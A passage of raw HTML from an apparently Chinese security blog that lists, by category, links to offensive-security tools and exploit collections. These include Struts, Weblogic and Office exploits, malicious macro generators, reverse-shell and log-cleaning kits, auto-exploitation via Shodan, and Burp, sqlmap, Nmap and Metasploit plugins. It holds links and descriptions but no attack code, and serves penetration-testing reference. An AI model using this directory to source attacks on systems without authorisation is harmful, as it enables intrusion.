class="line">https:&#x2F;&#x2F;github.com&#x2F;lavalamp-&#x2F;ipv666 go,ipv6 地址枚举扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;commixproject&#x2F;commix 命令注入漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Graph-X&#x2F;davscan DAVScan 是一款快速轻便的 webdav 扫描仪，旨在发现 DAV 启用的 Web 服务器上的隐藏文件和文件夹</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jcesarstef&#x2F;dotdotslash 目录遍历漏洞测试</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;P3GLEG&#x2F;WhaleTail 根据 docker 镜像生成成 dockerfile</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cr0hn&#x2F;dockerscan docker 扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;utiso&#x2F;dorkbot 通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NullArray&#x2F;DorkNet 基于搜索引擎的漏洞网页搜寻</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;panda-re&#x2F;lava 大规模向程序中植入恶意程序</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;woj-ciech&#x2F;Danger-zone 关联域名、IP 和电子邮件地址之间的数据并将其可视化输出</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;securemode&#x2F;DefenderKeys 枚举出被 Windows Defender 排除扫描的配置</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;D4Vinci&#x2F;PasteJacker 剪贴板劫持利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;JusticeRage&#x2F;freedomfighting 日志清理、文件共享、反向 shell、简单爬虫工具包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gh0stkey&#x2F;PoCBox 漏洞测试验证辅助平台，SONP 劫持、CORS、Flash 跨域资源读取、Google Hack 语法生成、URL 测试字典生成、JavaScript URL 跳转、302 URL 跳转</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jakubroztocil&#x2F;httpie http 调试工具，类似 curl，功能更完善</span><br><span class="line">https:&#x2F;&#x2F;www.getpostman.com&#x2F; http 调试工具，带界面</span><br></pre></td></tr></table></figure><h3 id="漏洞收集与-Exp、Poc-利用"><a href="#漏洞收集与-Exp、Poc-利用" class="headerlink" title="漏洞收集与 Exp、Poc 利用"></a>漏洞收集与 Exp、Poc 利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Lcys&#x2F;Python_PoC python3 的 poc、exp 快速编写模板，有众多模范版本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;raminfp&#x2F;linux_exploit_development linux 漏洞利用开发手册</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mudongliang&#x2F;LinuxFlaw 包含 linux 下软件漏洞列表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;coffeehb&#x2F;Some-PoC-oR-ExP 各种漏洞 poc、Exp 的收集或编写</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;userlandkernel&#x2F;plataoplomo Sem Voigtländer 公开其发现的 iOS 中各种漏洞，包括（Writeup&#x2F;POC&#x2F;Exploit）</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;coffeehb&#x2F;Some-PoC-oR-ExP&#x2F;blob&#x2F;master&#x2F;check_icmp_dos.py CVE-2018-4407，macos&#x2F;ios 缓冲区溢出可导致系统崩溃</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulnersCom&#x2F;getsploit py2,仿照 searchsploit 通过各种数据库的官方接口进行 payload 的查找</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;CMS-Hunter CMS 漏洞测试用例集合</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr5m1th&#x2F;0day 各种开源 CMS 各种版本的漏洞以及 EXP</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;w1109790800&#x2F;penetration CMS 新老版本 exp 与系统漏洞搜集表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blacknbunny&#x2F;libSSH-Authentication-Bypass CVE-2018-10933，libssh 服务端身份验证绕过</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;leapsecurity&#x2F;libssh-scanner CVE-2018-10933，libssh 服务端身份验证绕过</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;anbai-inc&#x2F;CVE-2018-4878 Adobe Flash Exploit 生成 payload</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RetireJS&#x2F;grunt-retire 扫描 js 扩展库的常见漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;coffeehb&#x2F;SSTIF 服务器端模板注入漏洞的半自动化工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tijme&#x2F;angularjs-csti-scanner 探测客户端 AngularJS 模板注入漏洞工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blackye&#x2F;Jenkins Jenkins 漏洞探测、用户抓取爆破</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap 服务器端模板注入漏洞检测与利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;irsdl&#x2F;IIS-ShortName-Scanner Java,IIS 短文件名暴力枚举漏洞利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;IIS_shortname_Scanner py2,IIS 短文件名漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rudSarkar&#x2F;crlf-injector CRLF 注入漏洞批量扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hahwul&#x2F;a2sv SSL 漏洞扫描，例如心脏滴血漏洞等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jagracey&#x2F;Regex-DoS RegEx 拒绝服务扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Bo0oM&#x2F;PHP_imap_open_exploit 利用 imap_open 绕过 php exec 函数禁用</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;106488 利用 mysql 服务端恶意配置读取客户端文件，（如何利用 MySQL LOCAL INFILE 读取客户端文件，Read MySQL Client&#39;s File，【技术分享】从 MySQL 出发的反击之路）</span><br><span class="line">https:&#x2F;&#x2F;www.waitalone.cn&#x2F;awvs-poc.html CVE-2015-4027，AWVS10 命令执行漏洞</span><br><span class="line">http:&#x2F;&#x2F;an7isec.blogspot.com&#x2F;2014&#x2F;04&#x2F;pown-noobs-acunetix-0day.html Pwn the n00bs - Acunetix 0day，awvs8 命令执行漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;numpy&#x2F;numpy&#x2F;issues&#x2F;12759 科学计算框架 numpy 命令执行 RCE 漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;petercunha&#x2F;Jenkins-PreAuth-RCE-PoC jenkins 远程命令执行</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WyAtu&#x2F;CVE-2018-20250 WinRar 执行漏洞加使用介绍</span><br></pre></td></tr></table></figure><h3 id="物联网路由工控漏洞收集"><a href="#物联网路由工控漏洞收集" class="headerlink" title="物联网路由工控漏洞收集"></a>物联网路由工控漏洞收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;yassineaboukir&#x2F;CVE-2018-0296 测试思科 ASA 路径穿越漏洞，可获取系统详细信息</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;seclab-ucr&#x2F;tcp_exploit 利用 tcp 漏洞使无线路由器产生隐私泄露</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ezelf&#x2F;CVE-2018-9995_dvr_credentials CVE-2018-9995 摄像头路由，Get DVR Credentials Java 反序列化漏洞收集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;brianwrf&#x2F;hackUtils java 反序列化利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GoSecure&#x2F;break-fast-serial 借助 DNS 解析来检测 Java 反序列化漏洞</span><br></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;s1kr10s&#x2F;Apache-Struts-v3 Apache-Struts 漏洞利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;iBearcat&#x2F;S2-057 struts2 CVE-2018-11776 漏洞检测工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ivan1ee&#x2F;struts2-057-exp struts2-057 利用脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;s2sniper struts2 漏洞的检测工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Lucifer1993&#x2F;struts-scan 批量检测 struts 命令执行漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;struts2_045_scan Struts2-045 漏洞批量扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;riusksk&#x2F;StrutScan 基于 perl 的 strut2 的历史漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Coalfire-Research&#x2F;java-deserialization-exploits java 反序列化漏洞收集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;quentinhardy&#x2F;jndiat weblogic 漏洞利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2018-3191 Weblogic CVE-2018-3191 远程代码命令执行</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;pyn3rd&#x2F;CVE-2018-3245 weblogic cve-2018-2893 与 cve-2018-3245 远程代码命令执行</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NickstaDB&#x2F;BaRMIe 用于 Java Remote Method Invocation 服务的工具&#x2F;rmi 的枚举与远程命令执行</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;joaomatosf&#x2F;jexboss JBoss 和其他 java 序列化漏洞验证和开发工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial java 反序列化利用工具</span><br></pre></td></tr></table></figure><h3 id="版本管理平台漏洞收集"><a href="#版本管理平台漏洞收集" class="headerlink" title="版本管理平台漏洞收集"></a>版本管理平台漏洞收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shengqi158&#x2F;svnhack .svn 文件夹泄漏利用工具</span><br><span class="line">https:&#x2F;&#x2F;www.waitalone.cn&#x2F;seay-svn-poc-donw-20140505.html Seay-Svn 源代码泄露漏洞利用工具，2014-05-05 版</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BugScanTeam&#x2F;GitHack .git 文件利用工具，lijiejie 改进版</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;GitHack .git 文件利用工具</span><br></pre></td></tr></table></figure><h3 id="MS-与-Office-漏洞收集"><a href="#MS-与-Office-漏洞收集" class="headerlink" title="MS 与 Office 漏洞收集"></a>MS 与 Office 漏洞收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Lz1y&#x2F;CVE-2017-8759 .NET Framework 换行符漏洞，CVE-2017-8759 完美复现（另附加 hta+powershell 弹框闪烁解决方案）https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;147793.html</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WyAtu&#x2F;CVE-2018-8581 Exchange 使用完成添加收信规则的操作进行横向渗透和提权漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dafthack&#x2F;MailSniper PS,用于在 Microsoft Exchange 环境搜索电子邮件查找特定邮件（密码、网络架构信息等）</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;ruler GO,通过 MAPI &#x2F; HTTP 或 RPC &#x2F; HTTP 协议远程与 Exchange 服务器进行交互,通过客户端 Outlook 功能远程获取 shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;Smbtouch-Scanner 扫描内网永恒之蓝 ETERNAL445SMB 系列漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;smgorelik&#x2F;Windows-RCE-exploits windows 命令执行 RCE 漏洞 POC 样本，分为 web 与文件两种形式</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;CVE-2017-8464-EXP CVE-2017-8464，win 快捷方式远程执行漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Lz1y&#x2F;CVE-2018-8420 Windows 的 msxml 解析器漏洞可以通过 ie 或 vbs 执行后门</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;163000 利用 Excel 4.0 宏躲避杀软检测的攻击技术分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BuffaloWill&#x2F;oxml_xxe XXE 漏洞利用</span><br><span class="line">https:&#x2F;&#x2F;thief.one&#x2F;2017&#x2F;06&#x2F;20&#x2F;1&#x2F; 浅谈 XXE 漏洞攻击与防御</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;thom-s&#x2F;docx-embeddedhtml-injection word2016，滥用 Word 联机视频特征执行恶意代码 poc</span><br><span class="line">https:&#x2F;&#x2F;blog.cymulate.com&#x2F;abusing-microsoft-office-online-video word2016，滥用 Word 联机视频特征执行恶意代码介绍</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xdeadbeefJERKY&#x2F;Office-DDE-Payloads 无需开启宏即可在 word 文档中利用 DDE 执行命令</span><br><span class="line">http:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;terminal&#x2F;150285.html 无需开启宏即可在 word 文档中利用 DDE 执行命令利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CVE-2017-11882 利用 word 文档 RTF 获取 shell，https:&#x2F;&#x2F;evi1cg.me&#x2F;archives&#x2F;CVE_2017_11882_exp.html</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Lz1y&#x2F;CVE-2017-8759 利用 word 文档 hta 获取 shell，http:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;147793.html</span><br><span class="line">https:&#x2F;&#x2F;fuping.site&#x2F;2017&#x2F;04&#x2F;18&#x2F;CVE-2017-0199 漏洞复现过程 WORD RTF 文档，配合 msf 利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tezukanice&#x2F;Office8570 利用 ppsx 幻灯片远程命令执行，https:&#x2F;&#x2F;github.com&#x2F;rxwx&#x2F;CVE-2017-8570</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0x09AL&#x2F;CVE-2018-8174-msf 目前支持的版本是 32 位 IE 浏览器和 32 位 office。网页访问上线，浏览器关闭，shell 依然存活，http:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;173727.html</span><br><span class="line">http:&#x2F;&#x2F;www.4hou.com&#x2F;technology&#x2F;9405.html 在 Office 文档的属性中隐藏攻击载荷</span><br><span class="line">https:&#x2F;&#x2F;evi1cg.me&#x2F;archives&#x2F;Create_PPSX.html 构造 PPSX 钓鱼文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;enigma0x3&#x2F;Generate-Macro PowerShell 脚本，生成含有恶意宏的 Microsoft Office 文档</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mwrlabs&#x2F;wePWNise 生成独立于体系结构的 VBA 代码，用于 Office 文档或模板，并自动绕过应用程序控制</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;curi0usJack&#x2F;luckystrike 基于 ps，用于创建恶意的 Office 宏文档</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sevagas&#x2F;macro_pack MS Office 文档、VBS 格式、快捷方式 payload 捆绑</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;khr0x40sh&#x2F;MacroShop 一组通过 Office 宏传递有效载荷的脚本</span><br></pre></td></tr></table></figure><h3 id="相关工具拓展插件"><a href="#相关工具拓展插件" class="headerlink" title="相关工具拓展插件"></a>相关工具拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AntSword-Store&#x2F; 中国蚁剑插件市场</span><br></pre></td></tr></table></figure><h3 id="Kali-环境下拓展插件"><a href="#Kali-环境下拓展插件" class="headerlink" title="Kali 环境下拓展插件"></a>Kali 环境下拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secforce&#x2F;sparta py，图形化应用程序联动 Nmap、Nikto、Hydra 等工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Manisso&#x2F;fsociety linux 下类似于 kali 的工具包一键安装工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;LionSec&#x2F;katoolin 使用 linux 服务器自动安装 kali 工具包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;skavngr&#x2F;rapidscan py2，simple，联动 kali 下工具，漏洞扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;koenbuyens&#x2F;kalirouter 将 kali 设置为一个路由流量分析系统</span><br></pre></td></tr></table></figure><h3 id="Burpsuit-相关工具拓展插件"><a href="#Burpsuit-相关工具拓展插件" class="headerlink" title="Burpsuit 相关工具拓展插件"></a>Burpsuit 相关工具拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PortSwigger burpsuite 官方插件库</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;snoopysecurity&#x2F;awesome-burp-extensions awesome 系列之 burp 拓展</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;d3vilbug&#x2F;HackBar 集成 hackbar</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PortSwigger&#x2F;turbo-intruder 比 Burp 自带的 Intruder 更快，一分钟打 1.61 万次请求</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ebryx&#x2F;AES-Killer burp 插件，破解 aes 加密的插件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bugcrowd&#x2F;HUNT 可以将 burpsuite 扫描器功能扩展的更加强大，同时支持 zapproxy 扩展</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wagiro&#x2F;BurpBounty burp 插件增强主动与被动扫描功能</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;BurpSuiteHTTPSmuggler Burp 拓展, 使用几种技巧绕过 WAF</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PortSwigger&#x2F;command-injection-attacker burp 插件，命令注入漏洞检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;freddy burp 插件，自动识别 Java&#x2F;.NET 应用程序中的反序列化漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;modzero&#x2F;interestingFileScanner burp 插件，增强敏感文件扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;summitt&#x2F;Burp-Non-HTTP-Extension burp 插件，布置 dns 服务器抓取流量</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ilmila&#x2F;J2EEScan burp 拓展，扫描 J2EE 应用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;JGillam&#x2F;burp-co2 集成了 sqlmap，菜刀，字典生成等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;SSRFmap burp 插件，检测 ssrf 漏洞</span><br></pre></td></tr></table></figure><h3 id="Sqlmap-相关工具拓展插件"><a href="#Sqlmap-相关工具拓展插件" class="headerlink" title="Sqlmap 相关工具拓展插件"></a>Sqlmap 相关工具拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;codewatchorg&#x2F;sqlipy burp 与 sqlmap 联动插件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Hood3dRob1n&#x2F;SQLMAP-Web-GUI sqlmap 的 web gui</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;KINGSABRI&#x2F;sqlmap-tamper-api 利用各种语言来编写 sqlmapTamper</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xbug&#x2F;SQLiScanner 一款基于 sqlmapapi 和 Charles 的被动 SQL 注入漏洞扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fengxuangit&#x2F;Fox-scan 基于 sqlmapapi 的主动和被动资源发现的漏洞扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;sqlmate 在 sqlmap 基础上增加了目录扫描、hash 爆破等功能</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ysrc&#x2F;GourdScanV2 ysrc 出品的被动式漏洞扫描工具，基于 sqlmapapi</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zt2&#x2F;sqli-hunter 基于 sqlmapapi，ruby 编写的漏洞代理型检测工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jesuiscamille&#x2F;AutoSQLi 利用 DorkNet，Googler, Ddgr, WhatWaf 和 sqlmap 自动注入</span><br></pre></td></tr></table></figure><h3 id="Nmap-相关工具拓展插件"><a href="#Nmap-相关工具拓展插件" class="headerlink" title="Nmap 相关工具拓展插件"></a>Nmap 相关工具拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ullaakut&#x2F;nmap GO，实现的 Nmap 调用库</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cldrn&#x2F;nmap-nse-scripts NSE 收集列表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulnersCom&#x2F;nmap-vulners 使用 nmap 扫描常见的服务漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;s4n7h0&#x2F;Halcyon Nmap Script (NSE)IDE 编辑器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;AutoNSE NSE 自动化利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Screetsec&#x2F;Dracnmap shell，将 Nmap 复杂的命令进行一定程度的集成与简化，使新用户更加容易上手。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cldrn&#x2F;rainmap-lite Django，Web 版 Nmap，可以建立新的扫描服务器，允许用户从他们的手机&#x2F;平板电脑&#x2F;网络浏览器启动 Nmap 扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;trimstray&#x2F;sandmap linux 下将支持使用大量 Nmap 引擎进行网络和系统侦察的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;HellRaiser 基于 nmap 的扫描器，与 cve 漏洞关联</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;scipag&#x2F;vulscan 基于 nmap 的高级漏洞扫描器，命令行环境使用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Rev3rseSecurity&#x2F;WebMap 将 nmap 的 xml web 展示器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DanMcInerney&#x2F;msf-autopwn 执行 NMap 扫描或读取扫描结果, 然后自动使用 msf 攻击包含常见漏洞的主机</span><br></pre></td></tr></table></figure><h3 id="Metasploit-相关工具拓展插件"><a href="#Metasploit-相关工具拓展插件" class="headerlink" title="Metasploit 相关工具拓展插件"></a>Metasploit 相关工具拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;13o-bbr-bbq&#x2F;machine_learning_security&#x2F;tree&#x2F;master&#x2F;DeepExploit 结合机器学习与 msf 的全自动测试工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;r00t-3xp10it&#x2F;Meterpreter_Paranoid_Mode-SSL 一个可以创建 SSL&#x2F;TLS shell 连接的脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DanMcInerney&#x2F;msf-netpwn 等待 msf 的 session，并自动提为域管理</span><br><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;45851&#x2F; msf 插件，利用 jira upm 上传进行命令执行</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NullArray&#x2F;AutoSploit 利用 Shodan 搜索引擎收集目标, 并自动调用设定的 msf 模块对目标发动攻击</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WazeHell&#x2F;metateta 使用 msf 脚本，根据特定协议进行扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fbkcs&#x2F;msf-elf-in-memory-execution Metasploit 模块, 用于在内存中执行 ELF 文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ElevenPaths&#x2F;Eternalblue-Doublepulsar-Metasploit metasploit 双星攻击利用文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;darkoperator&#x2F;Metasploit-Plugins msf 扩展资产搜集与帮助插件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;D4Vinci&#x2F;One-Lin3r metasploit、payload 辅助查询工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shizzz477&#x2F;msploitego 将 msf 数据库与 maltego 进行图形化展示</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;scriptjunkie&#x2F;msfgui metasploit 的 GUI 界面，话说现在 msf 对 windows 支持也挺好的</span><br></pre></td></tr></table></figure><h3 id="CobaltStrike-相关工具拓展插件"><a href="#CobaltStrike-相关工具拓展插件" class="headerlink" title="CobaltStrike 相关工具拓展插件"></a>CobaltStrike 相关工具拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 